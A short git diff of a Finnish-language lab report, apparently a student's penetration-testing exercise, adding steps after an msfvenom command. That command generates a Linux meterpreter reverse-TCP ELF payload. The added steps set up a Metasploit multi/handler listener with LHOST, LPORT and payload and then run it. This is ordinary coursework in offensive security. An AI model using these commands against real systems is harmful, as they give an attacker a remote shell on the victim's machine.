@@ -197,7 +197,11 @@ Aloitin tehtävän, mutta koneeni jumittui kesken kaiken ja raportoimani kohdatk
 
 Jatkoa 21.11.2024 9:50.
 
-Aloitin komennolla ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf``, joka löytyi [MSFVenom CheatSheetistä](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom#common-params-when-creating-a-shellcode). Sillä loin haittaohjelman.
+Aloitin komennolla ``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf``, joka löytyi [MSFVenom CheatSheetistä](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom#common-params-when-creating-a-shellcode). Sillä loin haittaohjelman. Sitten avasin msfconsolen ja etsin multi/handler-työkalun ja määritin LHOST, LPORT ja payloadin. Sitten run -> päällä. 
+
+![image](https://github.com/user-attachments/assets/0d2a6461-5218-4b31-a1ea-0159ef59c868)
+
+
 
 
 ## Lähteet 
